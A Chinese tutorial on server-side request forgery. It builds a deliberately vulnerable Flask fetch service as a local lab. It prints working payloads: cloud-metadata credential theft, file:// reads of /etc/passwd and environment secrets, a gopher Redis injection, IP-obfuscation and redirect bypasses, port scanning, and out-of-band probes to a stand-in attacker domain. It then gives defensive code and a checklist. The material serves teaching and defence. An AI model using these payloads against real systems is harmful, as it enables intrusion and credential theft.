二十分钟学透 SSRF 深入与防御

SSRF 不是"发个请求"那么简单。这篇讲清楚三件事：服务端代请求为什么危险、绕过手法的真实原理（IP 变形 / DNS rebinding / @ 欺骗 / 重定向）、以及能落地的防御代码（白名单、解析后校验、IMDSv2、网络层隔离）。

开始前

先建立一个靶场

SSRF 的核心是"服务端替你请求一个你指定的 URL"。要理解它，先得有一个会替你发请求的服务。

# 起一个回显请求信息的服务（httpbin 的 /get 会把你请求的 URL 参数回显）
docker run -d -p 8080:80 --name httpbin kennethreitz/httpbin

# 一个最脆弱的"图片抓取"服务（Python Flask，仅本地靶场用）
# pip install flask requests
cat > app.py <<'EOF'
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route("/fetch")
def fetch():
    url = request.args.get("url", "")
    r = requests.get(url, timeout=5)      # 没有任何校验：这就是一个 SSRF 靶场
    return r.text[:500]

app.run(host="127.0.0.1", port=5000)
EOF
python app.py

# 打自己：服务端视角的"本地"和你的"本地"不是同一台机器
curl "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:6379/"   # 请求服务端自己的 Redis
靶场纪律：这个练习只允许打你自己机器上的服务。对任何不是你拥有的目标发请求，都可能违反法律或公司安全政策。后面所有 payload 都从这个靶场出发。
模块 1

SSRF 原理：服务端代请求

SSRF（Server-Side Request Forgery）的本质：攻击者控制了服务端发起请求的目标地址。服务端替攻击者"伸手"去摸它摸得到、而你摸不到的地方。

为什么危险：服务端有三个你没有的位置优势

优势说明
位于内网应用服务器通常和数据库、缓存、中间件、其他微服务在同一个内网。外网防火墙只挡"外面进里面"，不挡"里面连里面"
拥有云身份EC2/ECS 实例通常挂载了 IAM Role，实例内访问 169.254.169.254 就能拿到临时凭证 —— 这把"打到内网 HTTP"升级成"拿到云账号权限"
被其他组件信任Redis、Elasticsearch、Kubernetes API 等默认监听在内网且没有认证或认证很弱。服务端发出的请求在它们眼里是"自己人"

业务里哪些功能最容易出 SSRF

功能点典型请求
远程图片/头像抓取GET /avatar?url=https://example.com/a.png
Webhook 回调POST /webhook {url, payload} → 服务端转发
RSS/链接预览GET /preview?link=... 服务端抓 OG 标签
PDF/截图生成wkhtmltopdf / headless Chrome 渲染用户给的 URL
OAuth 回调配置redirect_uri 校验不严 → 打到内网回调端点
文件导入/订阅从远程 URL 拉取 CSV、SVG、XML
微服务内部调用网关把用户传入的 host 拼进 upstream
# 一次典型攻击链（以靶场为例）
# 1. 确认服务端真的会发请求（回显 SSRF）
curl "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:8080/get?x=1"

# 2. 探测服务端本地端口（内网扫描）
for p in 22 80 443 3306 6379 8080 9200; do
  curl -s -o /dev/null -w "%{http_code} %{time_total}s port=$p\n" \
    "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:$p/"
done
# 端口开着通常返回 4xx/banner，关着连接被拒 —— 用响应差异判断开放状态
2019 年 Capital One 事件是 SSRF 的标准教材：攻击者利用 AWS WAF 后一个应用的 SSRF 漏洞，向 169.254.169.254 发起请求，从实例元数据服务拿到了 EC2 角色的临时凭证，再用这套凭证列出 S3 并下载了约 1 亿用户的数据。一次"发请求"的漏洞，最终变成了云账号数据泄露。SSRF 在云环境从来不是低危。

利用场景：元数据、内网、协议走私

场景一：云元数据服务（最值钱的靶子）

# AWS IMDSv1 的完整利用姿势（现在大部分应已升级 v2）
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"
# → iam/ security-groups/ ...
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# → 角色名，比如 my-app-role
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-app-role"
# → AccessKeyId / SecretAccessKey / Token 三件套，拿去直接调云 API

# 阿里云同理，端点换 100.100.100.100
curl "http://target/fetch?url=http://100.100.100.100/latest/meta-data/ram/security-credentials/"
169.254.169.254 是链路本地地址（169.254.0.0/16），只在链路内有效，所以"禁止外网访问"这句对它是废话 —— 它对同 VPC 内所有机器天然可达。能拦住它的只有：IMDSv2 的 token 机制，或者网络层（iptables/安全组）把容器访问元数据的流量定向到黑洞。

场景二：内网服务探测与打击

不同协议"中招"后的后果完全不同，这也是 SSRF 为什么常被排成中高危：

目标默认端口SSRF 打到的后果
Redis6379无认证时写 SSH key、写 crontab 反弹 shell、CONFIG SET dir 落 webshell
Elasticsearch9200无认证时遍历索引、读任意文档、删数据
K8s API443/6443读 Secret、创建特权 Pod（配合 ServiceAccount token）
Docker API2375无 TLS 时直接创建挂载宿主根目录的容器 = 宿主机沦陷
Web 控制台8080/9000 等未授权调用管理接口：重启、改配置、删数据

场景三：协议走私（SSRF 的"进阶伤害"）

如果服务端请求库支持任意协议（或至少支持 gopher/file/dict），SSRF 就从"读个网页"升级为与任意 TCP 服务对话。

# file 协议：读服务端本地文件
curl "http://target/fetch?url=file:///etc/passwd"
curl "http://target/fetch?url=file:///proc/self/environ"   # 环境变量里常有密钥

# dict 协议：探测服务 banner，判断端口上跑的是什么
curl "http://target/fetch?url=dict://127.0.0.1:6379/info"
# 返回 Redis 版本号；换 3306 能看到 MySQL 的握手包（含版本）

# gopher 协议：构造任意 TCP 字节流（最危险的一个）
# 例：给无认证 Redis 发一条命令，把结果写进一个 key
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_SET%20pwned%20yes%0d%0aQUIT%0d%0a"
# gopher 的 _ 后面是 TCP  payload，%0d%0a 是 CRLF —— 相当于手工发 Redis 协议
# 进阶：SLAVEOF 主从复制加载 .so、CONFIG SET dir 写 crontab、FastCGI 打 php-fpm
gopher 是协议走私的核心：HTTP 协议本身受"请求-响应"模型约束，而 gopher 让攻击者把原始字节流塞进任意 TCP 端口。所以对 SSRF 而言，限制协议白名单（只允许 http/https）和限制目标白名单一样重要。反过来，防御时如果不禁用 gopher，只封内网 IP 也会被打穿。
模块 3

绕过手法：五类，每类都有真实原理

1. IP 变形：绕过基于字符串的 IP 黑名单

写法等价于被谁绕过
http://2130706433/127.0.0.1 的十进制整数形式任何"匹配点分四段"的正则
http://0177.0.0.1/八进制 IP 段（Linux inet_aton 接受）不解析八进制的校验器
http://0x7f.0.0.1/十六进制 IP 段同上
http://127.1/省略补零的简写严格四段格式校验
http://0.0.0.0/Linux 上 0.0.0.0 路由到本机只封 127.0.0.0/8 的规则
http://[::1]/IPv6 环回只处理 IPv4 的逻辑
http://[::ffff:127.0.0.1]/IPv4-mapped IPv6只识别 ::1 的规则
http://１２７。０。０。１/Unicode 全角数字 + 全角句点不过 Unicode 归一化的校验
# 自证：下面这些写法在 Linux 上解析结果完全一样
python3 -c "import socket; print(socket.inet_aton('127.1').hex())"        # 7f000001
python3 -c "import socket; print(socket.inet_aton('0x7f.0.0.1').hex())"   # 7f000001
python3 -c "import socket; print(socket.gethostbyname('2130706433'))"     # 127.0.0.1

2. DNS rebinding：绕过"解析一次校验"

原理：攻击者域名配一个 TTL=0 的 A 记录，第一次解析返回公网 IP（通过白名单校验），第二次解析返回 127.0.0.1。校验和连接用了两次不同的解析结果。

# rebind.it 一类服务的公开演示：域名 pinfoo.rebind.it 交替返回
# 7f000001.c0a80001...（内网地址编码在域名里）
# 时序：
#   1. 应用 dns.resolve("evil.com")   → 1.2.3.4   ✓ 过白名单
#   2. http.get("evil.com") 内部再解析 → 127.0.0.1 ✗ 打到内网
# 两次解析之间攻击者把 DNS 记录换掉了（TTL 0 让每个查询都可能不同）

3. @ 欺骗与 URL 解析差异

# URL 规范：@ 前面是 userinfo，后面才是 host
http://api.trusted.com@127.0.0.1/     # 真实 host 是 127.0.0.1
http://127.0.0.1@api.trusted.com/     # 反过来，真实 host 是 trusted.com

# 各库对畸形 URL 的解析不一致，防御代码与请求库解析结果不同就可被打穿：
# http://trusted.com:80@127.0.0.1:6379/
# http://127.0.0.1:80#@api.trusted.com/
# http://api.trusted.com\t127.0.0.1/   （\t 是 tab，某些解析器截断）

4. 重定向跟随：302 跳到内网

# 攻击者完全可控的公网服务器，返回：
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/

# 应用发起时 URL 是 https://evil.com/redir（过了白名单）
# requests/浏览器默认自动跟随，第二跳已经在内网 —— 每跳都校验才能防住

5. 短链与开放式代理

  • 短链接（t.cn、bit.ly）：白名单看到的是短链域名，展开后是内网地址。防御要对最终 URL 校验，或干脆禁短链
  • DNS 记录轮换 / CNAME 链：白名单校验的是 A 记录，连接时走 CNAME 到内网
  • HTTPS 证书/SNI 与真实连接不一致：对 TLS 终结代理场景，校验 SNI 不等于校验目标
记住绕过的总规律：所有绕过都在利用"校验时看到的信息"和"连接时实际使用的信息"不一致 —— 字符串 vs 解析结果、域名 vs IP、第一跳 vs 后续跳。防御的设计目标就是消灭这个 gap：解析后校验、pin 住 IP、每一跳重新校验。
模块 4

盲 SSRF 与检测

盲 SSRF（Blind SSRF）：服务端发起了请求，但不把响应内容返回给攻击者。看不到内容 ≠ 没有危害 —— 元数据照样能被打到，危害只是从"读数据"降级为"触发动作"。

三种检测信道

信道原理工具
外带 DNS目标 URL 里放唯一子域名 abc123.oob.attacker.com，服务端解析它就会在 DNS 日志留下记录Burp Collaborator、dnslog.cn、自建 NS
时间侧信道端口开放 vs 关闭的响应时间差异可达毫秒~秒级（SYN→RST 立即拒绝 vs 超时）curl -w "%{time_total}"
间接回显错误页、日志、监控告警、邮件回调中间接暴露请求结果看 500 页面 / 应用日志
# 时间侧信道实测（靶场：5000 端口开着，5001 关着）
curl -s -o /dev/null -w "open_port: %{time_total}s\n" "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:5000/"
curl -s -o /dev/null -w "closed_port: %{time_total}s\n" "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:5001/"
# 关着的端口：连接被拒或等待超时，时间明显更长 —— 用时间差画出内网端口图

# 外带验证（盲 SSRF 的金标准）
curl "http://target/fetch?url=http://a1b2c3d4.oob.example.com/probe"
# 然后看 DNS 日志是否出现 a1b2c3d4.oob.example.com 的 A 记录查询
# 出现了 = 服务端真的解析了你的域名 = SSRF 实锤，且能看到服务端出口 IP
从防御视角，"检测"和"发现"同样重要：生产环境应对出站请求建立可见性 —— ① 所有对外请求走统一的 egress 代理，禁止业务容器直连；② 监控对 169.254.169.254、100.100.100.100、非业务内网段的连接尝试；③ 在 DNS 层记录异常查询。没有这些日志，出了事你连"请求从哪发出的"都查不到。
模块 5

防御：五层，从代码到网络

第一层：输入侧白名单

  • 域名白名单，不是黑名单。黑名单永远追不上变形和 0day 域名
  • 白名单要精确匹配：host === "api.trusted.com"，不是 endsWith（否则 api.trusted.com.evil.com 通过）
  • 协议白名单：只允许 http: / https:，显式禁用 gopher / file / dict / ftp
  • 禁止用户指定端口，或只允许 80/443

第二层：解析后校验（防 IP 变形与 rebinding）

顺序不能反：先 DNS 解析拿到全部 IP，逐个校验是公网单播地址，然后用这个 IP 建立连接。

第三层：连接侧加固

  • pin IP：把校验过的 IP 直接传给 HTTP 客户端（socket 层指定 address），Header 里带原 Host。让"再解析一次"没有机会发生
  • 重定向：allow_redirects=False，或每一跳都重新走一遍完整校验
  • 超时 + 响应大小上限：3~5 秒超时、响应体截断到 1MB，防止被慢端口拖死线程池

第四层：云元数据加固

# AWS：强制 IMDSv2（实例级 / 通过 launch template）
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxx \
  --http-tokens required \
  --http-put-response-hop-limit 1

# v2 与 v1 的关键差别：GET 直接读 → 必须先 PUT 拿 token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
# SSRF 漏洞只能发出 GET 类请求，没法先 PUT —— v2 让纯 GET 型 SSRF 报废

# 阿里云：实例元数据加固模式（同样强制 token）
# 控制台开启"实例元数据加固模式"，或 API Set InstanceMetadataOptions

# 容器场景：禁止 Pod 访问元数据（网络层定向黑洞）
iptables -A OUTPUT -d 169.254.169.254 -j DROP
# K8s 可用 NetworkPolicy 默认拒绝 + 显式放行（metadata 走 node 网络，需配合 CNI）

第五层：网络层隔离

  • 出站代理：业务容器不直接出网，所有请求走统一 egress 代理，代理上配白名单和日志
  • 安全组/防火墙：应用层只允许访问明确的出站目标（对象存储 CDN、合作方 API），默认拒绝
  • 元数据服务最小授权：给实例挂的 IAM Role 只授必要权限，SSRF 拿到 token 也干不了大事
  • 不响应不可信内容：不要把抓取到的远程内容直接内联进自己页面（防存储型 XSS 和二阶 SSRF）
防御组合的性价比排序：① 开启 IMDSv2 / 元数据加固（半小时，防住最贵的事故）；② 出站统一代理 + 白名单（一天，防住大部分利用）；③ 代码层解析后校验 + pin IP（需要改造，防住 rebinding 这类高级绕过）。三件事都做，SSRF 的剩余风险才可接受。
模块 6

修复代码：从漏洞版到安全版

漏洞版（Node.js）

// ✗ 用户传什么就打什么
app.get("/fetch", async (req, res) => {
  const r = await axios.get(req.query.url, { timeout: 5000 });
  res.send(r.data);
});
// 问题：无协议限制、无目标校验、自动跟随重定向、无响应大小上限

安全版（Node.js：白名单 + 解析后校验 + pin IP + 禁重定向）

const dns = require("dns").promises;
const net = require("net");
const http = require("http");
const https = require("https");

const ALLOWED = new Set(["api.trusted.com", "cdn.trusted.com"]);

function assertPublic(ip) {
  if (net.isIPv4(ip)) {
    if (ip.startsWith("127.") || ip === "0.0.0.0" ||
        ip.startsWith("10.") || ip.startsWith("169.254.") ||
        ip.startsWith("192.168.") || ip.startsWith("100.") ||
        /^172\.(1[6-9]|2\d|3[01])\./.test(ip)) {
      throw new Error("blocked private ip: " + ip);
    }
  } else {
    if (ip === "::1" || ip.startsWith("fe80:") || ip.startsWith("fc") ||
        ip.startsWith("fd") || ip.startsWith("::ffff:")) {
      throw new Error("blocked ipv6: " + ip);
    }
  }
}

async function safeFetch(inputUrl) {
  const u = new URL(inputUrl);
  // 1) 协议白名单
  if (u.protocol !== "http:" && u.protocol !== "https:") throw new Error("scheme");
  // 2) 主机精确白名单 + 端口
  if (!ALLOWED.has(u.hostname)) throw new Error("host");
  if (u.port && u.port !== "80" && u.port !== "443") throw new Error("port");
  // 3) 解析后校验：所有 A/AAAA 记录都必须是公网地址
  const ips = (await dns.resolve(u.hostname, { all: true })).map(x => x.address);
  ips.forEach(assertPublic);
  // 4) pin IP：用第一个 IP 建连，Host 头带原域名，杜绝二次解析
  const mod = u.protocol === "https:" ? https : http;
  const req = mod.request({
    host: ips[0],
    port: u.port || (u.protocol === "https:" ? 443 : 80),
    path: u.pathname + u.search,
    headers: { Host: u.hostname },
    servername: u.hostname,               // TLS SNI 仍用原域名，证书才能过
  });
  // 5) 超时保护；调用方负责 end()；不自动跟随重定向（本实现不处理 3xx）
  req.setTimeout(3000, () => req.destroy(new Error("timeout")));
  return req;
}

app.get("/fetch", async (req, res) => {
  try {
    const upstream = await safeFetch(req.query.url);
    const r = await new Promise((resolve, reject) => {
      let body = "";
      upstream.on("response", (resp) => {
        resp.setEncoding("utf8");
        resp.on("data", (c) => {
          body += c;
          if (body.length > 1e6) { upstream.destroy(); reject(new Error("too large")); }
        });
        resp.on("end", () => resolve({ status: resp.statusCode, body }));
      });
      upstream.on("error", reject);
      upstream.end();
    });
    res.json(r);
  } catch (e) {
    res.status(400).json({ error: "blocked" });   // 不把内部细节返回给用户
  }
});

安全版（Python：同样思路，更短）

import ipaddress, socket
from urllib.parse import urlparse
import requests

ALLOWED = {"api.trusted.com", "cdn.trusted.com"}

def safe_get(url):
    p = urlparse(url)
    if p.scheme not in ("http", "https"):
        raise ValueError("scheme blocked")
    if p.hostname not in ALLOWED:
        raise ValueError("host blocked")
    port = p.port or (443 if p.scheme == "https" else 80)
    if port not in (80, 443):
        raise ValueError("port blocked")

    # 解析后校验：每个地址都必须是全球单播
    infos = socket.getaddrinfo(p.hostname, port, proto=socket.IPPROTO_TCP)
    for info in infos:
        ip = ipaddress.ip_address(info[4][0])
        if not (ip.is_global and not ip.is_private and not ip.is_link_local):
            raise ValueError("ip blocked: %s" % ip)

    # pin IP：用 IP 直连，Host 头带原域名；不跟随重定向
    ip = infos[0][4][0]
    real = f"{p.scheme}://{ip}{p.path or '/'}"
    if p.query:
        real += "?" + p.query
    return requests.get(real, headers={"Host": p.hostname},
                        allow_redirects=False, timeout=(3, 5), stream=True)
Java 的坑：new URL(userInput).openConnection() 是老 SSRF 制造机。JDK 的 URL 解析与浏览器不一致（@、空白字符、畸形端口）。要用 URI.create() 严格解析，校验后手动构造 HttpRequest.newBuilder(uri)，并配 HttpClient.newBuilder().followRedirects(NEVER)。OkHttp 同理：followRedirects(false)、dns() 换成校验过的自定义 Dns 实现。
模块 7

与代理、网关的关系

大量 SSRF 不发生在业务代码里，而发生在代理层：正向代理、API 网关、服务网格 sidecar、headless 浏览器 —— 它们天生就是"替人发请求"的角色。

组件典型 SSRF 形态要点
Nginx 反代proxy_pass http://$host; 变量拼接Host 头可控时 $host 可被伪造成内网地址；变量触发运行时解析，需配 resolver 且校验
Nginx CRLFproxy_pass $uri; 含 %0d%0a未解码的 URI 变量带 CRLF 会注入请求头/走私请求行
API 网关上游地址来自租户配置多租户网关允许自定义 upstream 时，必须服务端校验目标（云网关靠 VPC link 绑定缓解）
服务网格sidecar 出站Envoy/Istio 的 egress 白名单（ServiceEntry）就是零信任里的"出站策略"，别开着全通
渲染服务headless Chrome 打开用户 URL能读 file://、探内网、执行 JS。必须：禁 file 协议、独立网络命名空间、短生命周期沙箱
Webhook 中继替租户转发回调对所有回调目标做与上述同样的校验；响应不要回传给提交者
# nginx 变量型 proxy_pass 的风险示例（不要照抄到生产）
location ~ ^/proxy/(.*)$ {
  resolver 127.0.0.11 valid=10s;
  proxy_pass http://$1;          # $1 是用户路径的一部分 → 用户决定上游
}
# 防御：上游只允许来自服务端配置的白名单，不允许请求路径决定 upstream
一个判断准则：任何"输入是 URL、输出是远程内容"的组件，都是 SSRF 面。评估时要问三个问题：协议能控吗？目标能控吗？每一跳都校验吗？三个里缺任何一个，就按有 SSRF 处理。
模块 8

十个真实坑

1
用字符串包含判断"是不是内网"
url.includes("127.0.0.1") 防不住 2130706433、0x7f000001、017700000001、127.1。IP 判断必须用网络库解析成规范形式再比范围。
2
只校验域名，不在解析后校验 IP
域名白名单是对的，但攻击者注册一个自己的域名解析到 127.0.0.1 就直接过。正确顺序：先过域名白名单，再解析，再校验每个 IP 是公网地址。
3
校验一次就信，连接时再次解析
DNS rebinding（TTL=0）专打这个 gap。校验后要把 IP pin 住再建连，或者把校验放进自定义 Dns/HTTP 适配器。
4
允许自动跟随 302 且每跳不校验
白名单看的是 evil.com/redir，实际打的是 169.254.169.254。要么 followRedirects(NEVER)，要么对每一跳重新完整校验。
5
用黑名单封内网段，漏一堆保留段
常见漏网：0.0.0.0（Linux 路由到本机）、127.1、::1、::ffff:127.0.0.1、100.64.0.0/10（CGNAT）、169.254.0.0/16（链路本地）、192.0.0.0/24、198.18.0.0/15。反过来用"只允许公网单播"的白名单思路。
6
不限制协议，gopher/file/dict 全放开
Python requests 不默认支持 gopher，但 urllib/curl/部分封装支持；file:// 直接读本地文件。协议白名单只留 http/https。
7
云上不开 IMDSv2，容器裸奔访问元数据
一次 SSRF 直接拿走实例角色临时凭证，等同于云账号部分权限泄露。IMDSv2（或阿里云加固模式）+ egress 限制，两件事半小时能做完。
8
把远程响应原文返回给前端
盲 SSRF 变回显 SSRF，内网扫描效率翻倍；同时还引入存储型 XSS（把远程 HTML 塞进自己页面）。响应要么不回显，要么按不可信内容消毒。
9
白名单用后缀匹配
endswith("trusted.com") 会放行 api.trusted.com.evil.com 和 nottrusted.com。要整体相等匹配，或至少匹配 ".trusted.com" 后缀且再取一层。
10
无超时、无响应大小限制、无出站日志
内网未开放端口让连接挂起，线程池被慢请求占满 = DoS；出站无日志，事后无法溯源是哪次请求打到了元数据。超时 3~5 秒 + 响应 1MB 截断 + 全量出站日志。
自测

六道题

1. SSRF 真正的危害来自哪里？
正确答案：服务端的位置和身份。攻击者自己摸不到内网，是服务端替他"伸手"，而且这只手还带着 IAM 临时凭证、内网信任关系。所以修复方向是收缩服务端的可达面，而不是修 HTTP。
2. 云服务器上最常见的元数据服务地址是？
正确答案：169.254.169.254。它是链路本地地址（169.254.0.0/16），对同 VPC 机器天然可达，所以必须靠 IMDSv2 或网络层策略拦截，不能指望"外网访问不到"。
3. gopher 协议在 SSRF 里为什么特别危险？
正确答案：构造任意 TCP 字节流。gopher://host:port/_后面就是原始 payload，攻击者可以完整控制协议内容，把 SSRF 从"读网页"升级为"打内网服务"。防御必须协议白名单只留 http/https。
4. DNS rebinding 利用的是哪种不一致？
正确答案：校验与连接的解析结果不一致。第一次解析返回公网 IP 过白名单，第二次解析返回 127.0.0.1 打进内网。防御是解析后校验 + pin IP 建连。
5. 防御 DNS rebinding 的正确做法是？
正确答案：解析后校验 + pin IP。长 TTL 反而帮攻击者缓存内网结果；禁 DNS 不现实。关键是消灭"校验看到的"和"连接用到的"之间的 gap。
6. AWS IMDSv2 相比 v1 的关键改进是？
正确答案：强制 token（PUT /latest/api/token）。SSRF 漏洞通常只能发出 GET 请求，无法先 PUT 拿 token，v2 直接把这类利用废掉。阿里云等厂商有等价加固机制，务必开启。

防御 checklist

# SSRF 上线前自查（10 条全过才放行）
[ ] 协议白名单：只允许 http/https，显式禁 gopher/file/dict/ftp
[ ] 目标白名单：精确相等匹配，不用后缀/包含匹配
[ ] 端口限制：只允许 80/443，禁止用户指定端口
[ ] 解析后校验：DNS 解析结果逐个判断为公网单播地址
[ ] pin IP：用校验过的 IP 建连，Host 头带原域名
[ ] 重定向：不自动跟随，或每一跳重新完整校验
[ ] 超时 3~5s + 响应体 1MB 截断
[ ] 云上开启 IMDSv2 / 元数据加固模式；容器禁访 169.254.169.254
[ ] 出站走统一 egress 代理，白名单 + 全量日志
[ ] 远程响应不回显给前端、不内联进自己页面
